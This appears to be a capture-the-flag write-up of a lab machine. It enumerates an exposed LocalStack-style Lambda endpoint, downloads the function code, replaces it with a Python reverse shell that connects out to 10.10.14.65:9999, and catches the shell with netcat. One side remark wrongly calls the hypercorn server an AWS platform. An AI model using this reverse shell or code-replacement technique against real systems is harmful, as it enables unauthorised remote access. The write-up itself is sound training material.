## Theta

```
$ nmap -sS -sV -Pn -p- -T5 -n 10.129.173.188

Nmap scan report for 10.129.173.188
Host is up (0.025s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
4566/tcp open  kwtc?
```

The tcp port 4566 was uncommon, we directly started to check what was hosted on it:


```bash
$ curl 10.129.173.188:4566 -v

*   Trying 10.129.173.188:4566...
* Connected to 10.129.173.188 (10.129.173.188) port 4566 (#0)
> GET / HTTP/1.1
> Host: 10.129.173.188:4566
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 
< content-type: text/html; charset=utf-8
[...]
< server: hypercorn-h11
< 
* Closing connection 0
{"status": "running"}
```

We saw it was hosted by `hypercorn-h11` which is a self-hosted AWS platform.

We next tried to list all the enabled features:

```bash
$ curl 10.129.173.188:4566/health -v

*   Trying 10.129.173.188:4566...
* Connected to 10.129.173.188 (10.129.173.188) port 4566 (#0)
> GET /health HTTP/1.1
> Host: 10.129.173.188:4566
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 
< content-type: application/json
[...]
< server: hypercorn-h11
< 
* Closing connection 0
{"services": {"lambda": "running", "logs": "running", "cloudwatch": "running"}, "features": {"persistence": "disabled", "initScripts": "initialized"}}
```

From there, we started by trying to see if we could access lambda features anonymously.

To do so, we used the `aws` CLI:

```bash
$ aws configure

AWS Access Key ID [None]: a
AWS Secret Access Key [None]: a
Default region name [None]: a
Default output format [None]: json
```

We listed the available lambda functions:

```bash
$ aws lambda --endpoint-url http://10.129.173.188:4566 list-functions

{
    "Functions": [
        {
            "FunctionName": "billing",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:billing",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::012351735804:role/billing_mgr",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 320,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2021-07-26T20:30:12.626+0000",
            "CodeSha256": "axGTZ4HEPBRMdbOYcTXdsnAjW6fSe3mBLZIugCLSsEc=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "8818a12d-a2ff-44ab-bb9a-761bb05dcb27",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

From there, we saw a single registered function publicly available. We then requested all the details about this lambda function:

```bash
$ aws lambda --endpoint-url http://10.129.173.188:4566 get-function --function-name billing

{
    "Configuration": {
        "FunctionName": "billing",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:billing",
        "Runtime": "python3.8",
        "Role": "arn:aws:iam::012351735804:role/billing_mgr",
        "Handler": "lambda_function.lambda_handler",
        "CodeSize": 320,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2021-07-26T20:30:12.626+0000",
        "CodeSha256": "axGTZ4HEPBRMdbOYcTXdsnAjW6fSe3mBLZIugCLSsEc=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "8818a12d-a2ff-44ab-bb9a-761bb05dcb27",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://10.129.173.188:4566/2015-03-31/functions/billing/code"
    },
    "Tags": {}
}
```

Then, we downloaded the function's code:

```bash
$ wget http://10.129.173.188:4566/2015-03-31/functions/billing/code -O code.zip
--2021-07-26 22:44:37--  http://10.129.173.188:4566/2015-03-31/functions/billing/code
Connecting to 10.129.173.188:4566... connected.
HTTP request sent, awaiting response... 200 
Length: 320 [application/zip]
Saving to: ‘code.zip’

code.zip                                                    100%[=========================================================================================================================================>]     320  --.-KB/s    in 0s      

2021-07-26 22:44:37 (1.83 MB/s) - ‘code.zip’ saved [320/320]

$ unzip code.zip
Archive:  code.zip
  inflating: lambda_function.py

$ cat lambda_function.py 
import json

def lambda_handler(event, context):
# Billing api logic
    return {
        'statusCode': 200,
        'body': json.dumps('Still in development')
    }
```

We deployed a new version that included a reverse shell on the function's code:

```bash
$ cat lambda_function.py

import socket,subprocess,os,pty

def lambda_handler(event, context):
    # Billing api logic
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("10.10.14.65",9999));
    os.dup2(s.fileno(),0); 
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    pty.spawn("/bin/sh")
    return {
        'statusCode': 200,
        'body': 'end'
    }


$ zip code.zip lambda_function.py 
  adding: lambda_function.py (deflated 36%)

$ aws lambda --endpoint-url http://10.129.173.188:4566 update-function-code --function-name billing  --zip-file fileb://code.zip
{
    "FunctionName": "billing",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:billing",
    "Runtime": "python3.8",
    "Role": "arn:aws:iam::012351735804:role/billing_mgr",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 427,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-07-26T20:30:12.626+0000",
    "CodeSha256": "5HTXA3MBTBtpaNm1Zs8WatuqTdGkTgcZeNt8Jy+ROhU=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "8818a12d-a2ff-44ab-bb9a-761bb05dcb27",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

Finally, we triggered the new version of the function and we received a connect-back from the virtual machine:

```bash
$ aws lambda --endpoint-url http://10.129.173.188:4566 invoke --function-name billing output.log

$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.173.188] 38538
(.venv) /tmp/localstack/zipfile.816dbcd9 # ^[[24;44R
^Z

stty raw -echo
fg
reset

(.venv) /tmp/localstack/zipfile.816dbcd9 # cat /opt/flag.txt 
HTB{upd4t3s_4r3_n0_m0r3_s3cur3}
```



